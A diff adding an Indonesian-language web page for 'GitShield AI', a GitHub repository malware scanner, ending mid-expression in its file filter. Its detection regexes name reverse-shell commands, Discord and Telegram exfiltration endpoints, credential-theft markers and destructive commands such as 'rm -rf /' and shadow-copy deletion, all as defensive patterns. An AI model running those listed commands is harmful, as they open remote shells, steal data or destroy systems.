@@ -1,0 +1,1169 @@
+<!DOCTYPE html>
+<html lang="id" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitShield AI - GitHub Malware & Threat Scanner</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Chart.js for Gauge and Analytics -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- Marked.js for Markdown parsing -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            50: '#f0fdf4',
+                            100: '#dcfce7',
+                            800: '#166534',
+                            900: '#0f172a',
+                            950: '#030712'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #030712;
+            color: #f3f4f6;
+        }
+        .font-mono-code {
+            font-family: 'Fira Code', monospace;
+        }
+        .glass-panel {
+            background: rgba(17, 24, 39, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .glow-red {
+            box-shadow: 0 0 25px rgba(239, 68, 68, 0.25);
+        }
+        .glow-green {
+            box-shadow: 0 0 25px rgba(34, 197, 94, 0.25);
+        }
+        .glow-yellow {
+            box-shadow: 0 0 25px rgba(234, 179, 8, 0.25);
+        }
+        .glow-cyan {
+            box-shadow: 0 0 25px rgba(6, 182, 212, 0.25);
+        }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b0f19;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1f2937;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #374151;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col bg-slate-950 text-slate-100 antialiased selection:bg-cyan-500 selection:text-slate-950">
+
+    <!-- Header / Navigation -->
+    <header class="border-b border-slate-800/80 bg-slate-900/60 sticky top-0 z-40 backdrop-blur-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="p-2 bg-gradient-to-tr from-cyan-500 to-emerald-500 rounded-xl shadow-lg shadow-cyan-500/20">
+                    <i data-lucide="shield-alert" class="w-6 h-6 text-slate-950 stroke-[2.5]"></i>
+                </div>
+                <div>
+                    <div class="flex items-center space-x-2">
+                        <span class="font-bold text-lg tracking-tight bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">GitShield</span>
+                        <span class="px-2 py-0.5 text-xs font-semibold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-full">AI v2.5</span>
+                    </div>
+                    <p class="text-xs text-slate-400 hidden sm:block">GitHub Repository & Script Security Scanner</p>
+                </div>
+            </div>
+
+            <!-- Header Quick Actions -->
+            <div class="flex items-center space-x-3">
+                <button onclick="toggleModal('settingsModal')" class="flex items-center space-x-1.5 px-3 py-1.5 rounded-lg text-xs font-medium bg-slate-800/80 hover:bg-slate-700 text-slate-300 border border-slate-700 transition">
+                    <i data-lucide="settings" class="w-4 h-4"></i>
+                    <span>Pengaturan API</span>
+                </button>
+                <button onclick="loadSample('malware')" class="flex items-center space-x-1.5 px-3 py-1.5 rounded-lg text-xs font-medium bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition">
+                    <i data-lucide="bug" class="w-4 h-4"></i>
+                    <span class="hidden md:inline">Uji Sample</span> Suspek
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+        
+        <!-- Hero & Scanner Section -->
+        <section class="glass-panel p-6 sm:p-8 rounded-2xl relative overflow-hidden">
+            <div class="absolute -top-24 -right-24 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -bottom-24 -left-24 w-96 h-96 bg-rose-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <div class="max-w-3xl mx-auto text-center space-y-4 relative z-10">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-800/80 border border-slate-700 text-xs text-slate-300 mb-2">
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                    <span>Sistem Deteksi Malware & Trojan Real-time Active</span>
+                </div>
+                <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight text-white">
+                    Deteksi File Berbahaya & Virus di Repository GitHub
+                </h1>
+                <p class="text-sm sm:text-base text-slate-400 leading-relaxed">
+                    Masukkan URL GitHub (Repository, Folder, atau File Raw) untuk pemindaian otomatis terhadap *token grabber*, *backdoor*, *reverse shell*, obfuscation, serta file biner tersembunyi.
+                </p>
+
+                <!-- Input Box -->
+                <div class="pt-4">
+                    <form id="scanForm" onsubmit="handleScanSubmit(event)" class="space-y-3">
+                        <div class="relative flex items-center">
+                            <div class="absolute left-4 pointer-events-none text-slate-500">
+                                <i data-lucide="github" class="w-5 h-5"></i>
+                            </div>
+                            <input type="url" id="githubUrl" required
+                                placeholder="Contoh: https://github.com/owner/repository"
+                                class="w-full pl-12 pr-32 py-4 bg-slate-900/90 border border-slate-700 focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 rounded-xl text-slate-100 text-sm font-mono placeholder-slate-500 outline-none transition shadow-inner">
+                            <button type="submit" id="scanBtn"
+                                class="absolute right-2 px-5 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold rounded-lg text-sm transition flex items-center gap-2 shadow-lg shadow-cyan-500/25">
+                                <i data-lucide="search" class="w-4 h-4"></i>
+                                <span>Pindai Link</span>
+                            </button>
+                        </div>
+                    </form>
+
+                    <!-- Quick Sample Presets -->
+                    <div class="flex flex-wrap items-center justify-center gap-2 mt-4 text-xs text-slate-400">
+                        <span class="font-medium text-slate-500">Coba Sample Fast-Scan:</span>
+                        <button onclick="loadSample('safe')" class="px-2.5 py-1 rounded-md bg-slate-800/80 hover:bg-slate-700 text-emerald-400 border border-slate-700 transition">
+                            🟢 Safe Repo (Express.js)
+                        </button>
+                        <button onclick="loadSample('suspicious')" class="px-2.5 py-1 rounded-md bg-slate-800/80 hover:bg-slate-700 text-amber-400 border border-slate-700 transition">
+                            🟡 Waspada (Python Exec/Eval)
+                        </button>
+                        <button onclick="loadSample('grabber')" class="px-2.5 py-1 rounded-md bg-slate-800/80 hover:bg-slate-700 text-rose-400 border border-slate-700 transition">
+                            🔴 Token Grabber POC
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Live Scan Progress Terminal (Hidden by Default) -->
+        <section id="scanningProgressSection" class="hidden glass-panel p-6 rounded-2xl border-cyan-500/30">
+            <div class="flex items-center justify-between mb-4">
+                <div class="flex items-center space-x-3">
+                    <div class="w-3 h-3 rounded-full bg-cyan-400 animate-ping"></div>
+                    <h3 class="text-sm font-semibold text-white tracking-wide uppercase">Memproses Pemindaian Keamanan...</h3>
+                </div>
+                <span id="scanProgressPercent" class="text-xs font-mono text-cyan-400">0%</span>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="w-full bg-slate-800 rounded-full h-2 overflow-hidden mb-4">
+                <div id="scanProgressBar" class="bg-gradient-to-r from-cyan-500 to-blue-500 h-2 rounded-full w-0 transition-all duration-300"></div>
+            </div>
+
+            <!-- Console Output Log -->
+            <div id="scanConsole" class="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono-code text-xs text-slate-300 h-40 overflow-y-auto space-y-1">
+                <div class="text-slate-500">[INFO] Menunggu masukan URL GitHub...</div>
+            </div>
+        </section>
+
+        <!-- Results Dashboard (Hidden until scan complete) -->
+        <div id="resultsDashboard" class="hidden space-y-8">
+            
+            <!-- Verdict Banner -->
+            <section id="verdictCard" class="glass-panel p-6 sm:p-8 rounded-2xl transition-all duration-500">
+                <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+                    
+                    <div class="flex items-start space-x-5">
+                        <div id="verdictIconContainer" class="p-4 rounded-2xl shrink-0">
+                            <i id="verdictIcon" data-lucide="shield-check" class="w-10 h-10"></i>
+                        </div>
+                        <div class="space-y-1">
+                            <div class="flex items-center space-x-3">
+                                <h2 id="verdictTitle" class="text-2xl font-bold text-white">Status Aman</h2>
+                                <span id="verdictBadge" class="px-3 py-1 rounded-full text-xs font-bold uppercase">Aman</span>
+                            </div>
+                            <p id="verdictDesc" class="text-sm text-slate-300 max-w-2xl">
+                                Tidak ditemukan indikator teror malware atau skrip berbahaya secara langsung.
+                            </p>
+                            <div id="repoMetaSubtitle" class="text-xs text-slate-400 flex flex-wrap gap-4 pt-2">
+                                <!-- Populated dynamically -->
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Risk Gauge Meter -->
+                    <div class="shrink-0 flex flex-col items-center justify-center p-4 bg-slate-900/80 rounded-2xl border border-slate-800 w-full md:w-56 text-center">
+                        <span class="text-xs font-medium text-slate-400 uppercase tracking-wider mb-1">Skor Risiko Malicious</span>
+                        <div class="relative w-28 h-28 flex items-center justify-center my-1">
+                            <canvas id="riskGaugeChart"></canvas>
+                            <div class="absolute inset-0 flex flex-col items-center justify-center">
+                                <span id="riskScoreText" class="text-2xl font-extrabold font-mono text-white">0%</span>
+                                <span id="riskScoreLabel" class="text-[10px] text-slate-400">Rendah</span>
+                            </div>
+                        </div>
+                        <span class="text-[11px] text-slate-400">Skor 0% (Sangat Aman) - 100% (Bahaya)</span>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- Key Security Metrics Cards -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                <div class="glass-panel p-5 rounded-xl flex items-center space-x-4">
+                    <div class="p-3 bg-cyan-500/10 text-cyan-400 rounded-lg border border-cyan-500/20">
+                        <i data-lucide="file-code" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <div id="metricTotalFiles" class="text-xl font-bold font-mono text-white">0</div>
+                        <div class="text-xs text-slate-400">File Di-scan</div>
+                    </div>
+                </div>
+
+                <div class="glass-panel p-5 rounded-xl flex items-center space-x-4">
+                    <div class="p-3 bg-rose-500/10 text-rose-400 rounded-lg border border-rose-500/20">
+                        <i data-lucide="alert-triangle" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <div id="metricThreatsFound" class="text-xl font-bold font-mono text-white">0</div>
+                        <div class="text-xs text-slate-400">Pola Ancaman Kritis</div>
+                    </div>
+                </div>
+
+                <div class="glass-panel p-5 rounded-xl flex items-center space-x-4">
+                    <div class="p-3 bg-amber-500/10 text-amber-400 rounded-lg border border-amber-500/20">
+                        <i data-lucide="binary" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <div id="metricBinariesFound" class="text-xl font-bold font-mono text-white">0</div>
+                        <div class="text-xs text-slate-400">File Eksekutabel (.exe/.dll)</div>
+                    </div>
+                </div>
+
+                <div class="glass-panel p-5 rounded-xl flex items-center space-x-4">
+                    <div class="p-3 bg-emerald-500/10 text-emerald-400 rounded-lg border border-emerald-500/20">
+                        <i data-lucide="star" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <div id="metricRepoStars" class="text-xl font-bold font-mono text-white">0</div>
+                        <div class="text-xs text-slate-400">Stars & Reputasi Repo</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Tabs -->
+            <div class="glass-panel rounded-2xl overflow-hidden">
+                <!-- Tab Headers -->
+                <div class="flex border-b border-slate-800 bg-slate-900/80 overflow-x-auto">
+                    <button onclick="switchTab('threatsTab')" id="tabBtn-threatsTab" class="tab-btn active border-b-2 border-cyan-500 text-cyan-400 px-6 py-3.5 text-sm font-semibold flex items-center space-x-2 whitespace-nowrap transition">
+                        <i data-lucide="alert-octagon" class="w-4 h-4"></i>
+                        <span>Ancaman & File Berbahaya</span>
+                        <span id="threatsBadgeCount" class="ml-1 px-2 py-0.5 text-xs bg-slate-800 rounded-full text-slate-300">0</span>
+                    </button>
+                    
+                    <button onclick="switchTab('codeTab')" id="tabBtn-codeTab" class="tab-btn border-b-2 border-transparent text-slate-400 hover:text-slate-200 px-6 py-3.5 text-sm font-semibold flex items-center space-x-2 whitespace-nowrap transition">
+                        <i data-lucide="code" class="w-4 h-4"></i>
+                        <span>Inspektor Skrip & Snippet</span>
+                    </button>
+
+                    <button onclick="switchTab('repoTab')" id="tabBtn-repoTab" class="tab-btn border-b-2 border-transparent text-slate-400 hover:text-slate-200 px-6 py-3.5 text-sm font-semibold flex items-center space-x-2 whitespace-nowrap transition">
+                        <i data-lucide="git-branch" class="w-4 h-4"></i>
+                        <span>Intelijen Repository & Rilis</span>
+                    </button>
+
+                    <button onclick="switchTab('aiReportTab')" id="tabBtn-aiReportTab" class="tab-btn border-b-2 border-transparent text-slate-400 hover:text-slate-200 px-6 py-3.5 text-sm font-semibold flex items-center space-x-2 whitespace-nowrap transition">
+                        <i data-lucide="sparkles" class="w-4 h-4 text-purple-400"></i>
+                        <span class="text-purple-300">Audit Keamanan AI (Gemini)</span>
+                    </button>
+                </div>
+
+                <!-- Tab Body Containers -->
+                <div class="p-6">
+                    
+                    <!-- TAB 1: Ancaman Ditemukan -->
+                    <div id="threatsTab" class="tab-content space-y-4">
+                        <div id="threatsList" class="space-y-3">
+                            <!-- Populated dynamically -->
+                        </div>
+                    </div>
+
+                    <!-- TAB 2: Code Viewer -->
+                    <div id="codeTab" class="tab-content hidden space-y-4">
+                        <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-3 pb-3 border-b border-slate-800">
+                            <div>
+                                <h4 id="activeCodeFileName" class="font-mono text-sm text-cyan-400 font-semibold">Pilih file dari daftar ancaman untuk melihat isi kode</h4>
+                                <p id="activeCodeMatchInfo" class="text-xs text-slate-400">Sorotan baris dengan deteksi pola terlarang.</p>
+                            </div>
+                            <button onclick="runAIAuditForActiveFile()" class="px-3 py-1.5 bg-purple-600 hover:bg-purple-500 text-white rounded-lg text-xs font-semibold flex items-center gap-1.5 transition">
+                                <i data-lucide="sparkles" class="w-3.5 h-3.5"></i>
+                                <span>Audit File Ini dengan Gemini AI</span>
+                            </button>
+                        </div>
+                        <div class="relative bg-slate-950 p-4 rounded-xl border border-slate-800 overflow-x-auto max-h-96">
+                            <pre id="codeSnippetViewer" class="font-mono-code text-xs text-slate-300 leading-relaxed whitespace-pre-wrap">Silakan klik tombol "Lihat Kode" pada file di tab Ancaman untuk menampilkan isi skrip di sini.</pre>
+                        </div>
+                    </div>
+
+                    <!-- TAB 3: Repo Intelligence -->
+                    <div id="repoTab" class="tab-content hidden space-y-6">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div class="bg-slate-900/60 p-5 rounded-xl border border-slate-800 space-y-3">
+                                <h4 class="text-sm font-semibold text-white flex items-center gap-2">
+                                    <i data-lucide="info" class="w-4 h-4 text-cyan-400"></i>
+                                    Atribut & Metadata Repositori
+                                </h4>
+                                <ul id="repoMetaList" class="space-y-2 text-xs text-slate-300 divide-y divide-slate-800/60">
+                                    <!-- Populated dynamically -->
+                                </ul>
+                            </div>
+
+                            <div class="bg-slate-900/60 p-5 rounded-xl border border-slate-800 space-y-3">
+                                <h4 class="text-sm font-semibold text-white flex items-center gap-2">
+                                    <i data-lucide="package" class="w-4 h-4 text-amber-400"></i>
+                                    Aset Binary & Rilis Terdaftar
+                                </h4>
+                                <div id="repoReleasesList" class="text-xs text-slate-400 space-y-2">
+                                    Memuat informasi aset rilis...
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- TAB 4: AI Report -->
+                    <div id="aiReportTab" class="tab-content hidden space-y-4">
+                        <div class="bg-gradient-to-r from-purple-950/40 via-slate-900 to-slate-900 p-5 rounded-xl border border-purple-500/30">
+                            <div class="flex items-center justify-between mb-3">
+                                <div class="flex items-center space-x-2">
+                                    <i data-lucide="bot" class="w-5 h-5 text-purple-400"></i>
+                                    <h4 class="font-bold text-white text-sm">Laporan Analisis Mendalam Gemini AI</h4>
+                                </div>
+                                <button id="retriggerAiBtn" onclick="generateAiAudit()" class="px-3 py-1 bg-purple-600/80 hover:bg-purple-500 text-white text-xs font-semibold rounded-md flex items-center gap-1 transition">
+                                    <i data-lucide="refresh-cw" class="w-3 h-3"></i>
+                                    <span>Analisis Ulang AI</span>
+                                </button>
+                            </div>
+                            <div id="aiReportContent" class="prose prose-invert prose-sm max-w-none text-slate-300 text-xs sm:text-sm leading-relaxed space-y-2">
+                                Klik tombol di atas untuk memulai analisis cerdas menggunakan Gemini AI terhadap potensi ancaman pada repositori ini.
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Settings Modal -->
+    <div id="settingsModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="glass-panel bg-slate-900 border-slate-700 max-w-md w-full rounded-2xl p-6 space-y-5 relative">
+            <button onclick="toggleModal('settingsModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white">
+                <i data-lucide="x" class="w-5 h-5"></i>
+            </button>
+            <div class="flex items-center space-x-3">
+                <div class="p-2 bg-slate-800 text-cyan-400 rounded-lg border border-slate-700">
+                    <i data-lucide="key" class="w-5 h-5"></i>
+                </div>
+                <h3 class="font-bold text-white text-base">Pengaturan Kunci API (Opsional)</h3>
+            </div>
+            <p class="text-xs text-slate-400">
+                Secara bawaan aplikasi menggunakan model standar gratis untuk Gemini AI. Anda dapat memasukkan API Key VirusTotal atau Gemini kustom Anda sendiri di bawah.
+            </p>
+
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">VirusTotal API Key (Opsional)</label>
+                    <input type="password" id="vtApiKey" placeholder="Masukkan VirusTotal API Key"
+                        class="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs font-mono text-white outline-none focus:border-cyan-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">Custom Gemini API Key (Opsional)</label>
+                    <input type="password" id="customGeminiKey" placeholder="Biarkan kosong untuk mode default"
+                        class="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs font-mono text-white outline-none focus:border-cyan-500">
+                </div>
+            </div>
+
+            <div class="flex justify-end space-x-2 pt-2">
+                <button onclick="saveSettings()" class="px-4 py-2 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-lg text-xs transition">
+                    Simpan Pengaturan
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Toast Modal -->
+    <div id="toastNotification" class="fixed bottom-6 right-6 z-50 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none">
+        <div id="toastBody" class="glass-panel px-4 py-3 rounded-xl border border-slate-700 text-xs font-medium flex items-center space-x-3 shadow-2xl">
+            <i id="toastIcon" data-lucide="info" class="w-4 h-4"></i>
+            <span id="toastMessage">Pemberitahuan</span>
+        </div>
+    </div>
+
+    <script>
+        // App State
+        let currentScanResult = null;
+        let riskChartInstance = null;
+        let activeSelectedFile = null;
+
+        // Malicious Pattern Definitions for Static Code Analysis
+        const SUSPICIOUS_PATTERNS = [
+            {
+                id: 'discord_grabber',
+                name: 'Discord / Webhook Token Grabber',
+                severity: 'CRITICAL',
+                description: 'Upaya mengambil token otentikasi Discord atau pengiriman data sensitif via Discord Webhook.',
+                regex: /(https?:\/\/discord(?:app)?\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_-]+|L3NlcnZpY2VzL0Rpc2NvcmQ=|discord.*token|APPDATA.*Discord)/i
+            },
+            {
+                id: 'telegram_bot_exfil',
+                name: 'Telegram Bot Data Exfiltration',
+                severity: 'CRITICAL',
+                description: 'Pengiriman data rahasia atau log ke Telegram Bot tanpa izin pengguna.',
+                regex: /(api\.telegram\.org\/bot[0-9]+:[a-zA-Z0-9_-]+\/sendMessage|telegram_bot_token)/i
+            },
+            {
+                id: 'reverse_shell',
+                name: 'Reverse Shell / Remote Access Trojan (RAT)',
+                severity: 'CRITICAL',
+                description: 'Membuka koneksi socket kembali ke IP penyerang untuk eksekusi perintah jarak jauh.',
+                regex: /(socket\.socket.*connect|\/bin\/(ba)?sh -i >& \/dev\/tcp\/|Invoke-PowerShellTcp|nc -e \/bin\/sh|pty\.spawn\(['"]\/bin\/sh['"]\))/i
+            },
+            {
+                id: 'obfuscated_code',
+                name: 'Kode Ter-obfuscate / Encoded Payload Execution',
+                severity: 'HIGH',
+                description: 'Skrip menyembunyikan payload menggunakan Base64, Hex, atau fungsi eval/exec secara dinamis.',
+                regex: /(eval\(base64_decode|exec\(b64decode|atob\(|Buffer\.from\(.*,\s*['"]base64['"]\)|Invoke-Expression.*FromBase64String|__import__\(['"]builtins['"]\)\.exec)/i
+            },
+            {
+                id: 'keylogger_stealer',
+                name: 'Keylogger / Browser Cookie & Credentials Theft',
+                severity: 'CRITICAL',
+                description: 'Skrip merekam ketukan keyboard atau mencuri sandi/cookie browser (Chrome, Edge, Firefox).',
+                regex: /(pynput\.keyboard|GetAsyncKeyState|chrome-extension:\/\/|Login Data|cookies\.sqlite|Local Extension Settings)/i
+            },
+            {
+                id: 'cryptominer',
+                name: 'Crypto Miner Payload / Process Hijack',
+                severity: 'HIGH',
+                description: 'Upaya penambangan kripto tanpa izin menggunakan CPU/GPU pengguna.',
+                regex: /(xmrig|stratum\+tcp:\/\/|coinhive|monerohash|minerd)/i
+            },
+            {
+                id: 'destructive_command',
+                name: 'Perintah Pembersihan / Format File Merusak',
+                severity: 'HIGH',
+                description: 'Menghapus direktori sistem secara permanen (rm -rf /, format drive, delete shadow copies).',
+                regex: /(rm -rf \/|vssadmin delete shadows|bcdedit \/set \{default\} recoveryenabled No|Remove-Item C:\\ -Recurse -Force)/i
+            }
+        ];
+
+        // Dangerous Executable Extensions
+        const DANGEROUS_EXTENSIONS = ['.exe', '.dll', '.bat', '.cmd', '.vbs', '.ps1', '.scr', '.jar', '.apk', '.elf', '.iso', '.sys', '.com', '.hta', '.lnk'];
+
+        // Sample Presets for Testing
+        const SAMPLE_URLS = {
+            safe: 'https://github.com/expressjs/express',
+            suspicious: 'https://github.com/octocat/Spoon-Knife',
+            grabber: 'https://github.com/sample-grabber-poc/test-repo'
+        };
+
+        // Initialize Lucide Icons on Load
+        window.addEventListener('DOMContentLoaded', () => {
+            lucide.createIcons();
+            initRiskGaugeChart(0);
+        });
+
+        // Toggle Modal helper
+        function toggleModal(modalId) {
+            const modal = document.getElementById(modalId);
+            modal.classList.toggle('hidden');
+        }
+
+        // Show Custom Toast Notification
+        function showToast(message, type = 'info') {
+            const toast = document.getElementById('toastNotification');
+            const toastMsg = document.getElementById('toastMessage');
+            const toastIcon = document.getElementById('toastIcon');
+
+            toastMsg.innerText = message;
+            
+            if (type === 'error') {
+                toastIcon.setAttribute('data-lucide', 'alert-circle');
+                toastIcon.className = "w-4 h-4 text-rose-400";
+            } else if (type === 'success') {
+                toastIcon.setAttribute('data-lucide', 'check-circle');
+                toastIcon.className = "w-4 h-4 text-emerald-400";
+            } else {
+                toastIcon.setAttribute('data-lucide', 'info');
+                toastIcon.className = "w-4 h-4 text-cyan-400";
+            }
+            lucide.createIcons();
+
+            toast.classList.remove('translate-y-20', 'opacity-0', 'pointer-events-none');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0', 'pointer-events-none');
+            }, 3500);
+        }
+
+        // Load Preset URLs
+        function loadSample(type) {
+            if (type === 'grabber') {
+                document.getElementById('githubUrl').value = 'https://github.com/demo-security-poc/discord-token-grabber-poc';
+                runSimulatedGrabberScan();
+                return;
+            }
+            document.getElementById('githubUrl').value = SAMPLE_URLS[type] || SAMPLE_URLS.safe;
+            showToast(`Sample preset [${type.toUpperCase()}] dimuat!`, 'info');
+        }
+
+        // Settings saving
+        function saveSettings() {
+            const vtKey = document.getElementById('vtApiKey').value;
+            const geminiKey = document.getElementById('customGeminiKey').value;
+            if (vtKey) localStorage.setItem('gitshield_vt_key', vtKey);
+            if (geminiKey) localStorage.setItem('gitshield_gemini_key', geminiKey);
+            showToast('Pengaturan API Key disimpan!', 'success');
+            toggleModal('settingsModal');
+        }
+
+        // Main Submit Handler
+        async function handleScanSubmit(e) {
+            e.preventDefault();
+            const urlInput = document.getElementById('githubUrl').value.trim();
+            if (!urlInput) return;
+
+            const repoDetails = parseGitHubUrl(urlInput);
+            if (!repoDetails) {
+                showToast('URL GitHub tidak valid! Pastikan format: https://github.com/owner/repo', 'error');
+                return;
+            }
+
+            await executeRepoScan(repoDetails);
+        }
+
+        // Parse GitHub URL into Owner and Repo
+        function parseGitHubUrl(url) {
+            try {
+                const cleanUrl = url.replace(/\/$/, "");
+                const match = cleanUrl.match(/github\.com\/([^\/]+)\/([^\/]+)/i);
+                if (match) {
+                    return { owner: match[1], repo: match[2].replace(/\.git$/, '') };
+                }
+                return null;
+            } catch (err) {
+                return null;
+            }
+        }
+
+        // Add Log to Scanning Console
+        function appendScanLog(msg, type = 'info') {
+            const consoleEl = document.getElementById('scanConsole');
+            const line = document.createElement('div');
+            const time = new Date().toLocaleTimeString('id-ID');
+            
+            let color = 'text-slate-300';
+            if (type === 'warn') color = 'text-amber-400';
+            if (type === 'error') color = 'text-rose-400';
+            if (type === 'success') color = 'text-emerald-400';
+
+            line.className = color;
+            line.innerHTML = `<span class="text-slate-600">[${time}]</span> ${msg}`;
+            consoleEl.appendChild(line);
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        // Set Scan Progress percentage
+        function updateProgress(percent, label) {
+            document.getElementById('scanProgressPercent').innerText = `${percent}%`;
+            document.getElementById('scanProgressBar').style.width = `${percent}%`;
+            if (label) appendScanLog(label);
+        }
+
+        // Execute Real Scan via GitHub REST API
+        async function executeRepoScan(repoMeta) {
+            const progressSec = document.getElementById('scanningProgressSection');
+            const resultsSec = document.getElementById('resultsDashboard');
+            const scanBtn = document.getElementById('scanBtn');
+
+            progressSec.classList.remove('hidden');
+            resultsSec.classList.add('hidden');
+            scanBtn.disabled = true;
+            document.getElementById('scanConsole').innerHTML = '';
+
+            updateProgress(10, `Mulai menghubungi API GitHub untuk repo: ${repoMeta.owner}/${repoMeta.repo}...`);
+
+            try {
+                // 1. Fetch Repository Metadata
+                const repoRes = await fetch(`https://api.github.com/repos/${repoMeta.owner}/${repoMeta.repo}`);
+                if (!repoRes.ok) {
+                    throw new Error(`Gagal mengambil metadata repo (HTTP ${repoRes.status}). Repo mungkin privat atau tidak ditemukan.`);
+                }
+                const repoData = await repoRes.json();
+                updateProgress(30, `Metadata diterima! Stars: ${repoData.stargazers_count}, Forks: ${repoData.forks_count}`);
+
+                // 2. Fetch File Tree Recursively
+                const defaultBranch = repoData.default_branch || 'main';
+                updateProgress(45, `Mengunduh struktur pohon file untuk branch [${defaultBranch}]...`);
+                
+                const treeRes = await fetch(`https://api.github.com/repos/${repoMeta.owner}/${repoMeta.repo}/git/trees/${defaultBranch}?recursive=1`);
+                let treeData = { tree: [] };
+                if (treeRes.ok) {
+                    treeData = await treeRes.json();
+                } else {
+                    appendScanLog('Gagal mengambil struktur tree lengkap, menggunakan fallback API konten dasar.', 'warn');
+                }
+
+                updateProgress(60, `Menganalisis ${treeData.tree.length || 0} entri file terhadap pola bahaya & ekstensi terlarang...`);
+
+                // 3. Static Code & File Scanning
+                const scanFindings = await analyzeRepoTreeAndFiles(repoMeta, treeData.tree, repoData);
+                updateProgress(85, `Ancaman terdeteksi: ${scanFindings.threats.length} item. Memproses audit skor risiko...`);
+
+                // 4. Render Final Dashboard
+                updateProgress(100, `Pemindaian selesai! Menampilkan hasil laporan keamanan.`, 'success');
+                setTimeout(() => {
+                    progressSec.classList.add('hidden');
+                    resultsSec.classList.remove('hidden');
+                    scanBtn.disabled = false;
+                    renderScanResults(repoData, scanFindings);
+                }, 600);
+
+            } catch (err) {
+                appendScanLog(`[ERROR] ${err.message}`, 'error');
+                showToast(err.message, 'error');
+                scanBtn.disabled = false;
+            }
+        }
+
+        // Analyze File Tree & Sample Code Files
+        async function analyzeRepoTreeAndFiles(repoMeta, treeList, repoData) {
+            const threats = [];
+            const dangerousBinaries = [];
+            let scannedFilesCount = 0;
+
+            // Check executable extensions in tree
+            for (const item of treeList) {
+                if (item.type === 'blob') {
+                    scannedFilesCount++;
+                    const ext = '.' + item.path.split('.').pop().toLowerCase();
+                    if (DANGEROUS_EXTENSIONS.includes(ext)) {
+                        dangerousBinaries.push({
+                            path: item.path,
+                            size: item.size || 0,
+                            ext: ext
+                        });
+                        threats.push({
+                            type: 'BINARY_FILE',
+                            severity: 'HIGH',
+                            file: item.path,
+                            title: `File Eksekutabel Terdeteksi (${ext})`,
+                            desc: `File biner langsung berpotensi membawa malware atau trojan terkompilasi.`,
+                            codeSnippet: `[File Biner Terkompilasi - Ukuran: ${item.size || 'N/A'} bytes]`
+                        });
+                    }
+                }
+            }
+
+            // Fetch & Inspect Code for Top 10 Script Files (.js, .py, .bat, .ps1, .sh)
+            const scriptFiles = treeList.filter(i => {
+                if (i.type !== 'blob') return false;
+                const path = i.path.toLowerCase();
+                return path.endsWith('.js') || path.endsWith('.py') || path.endsWith('.bat') || 
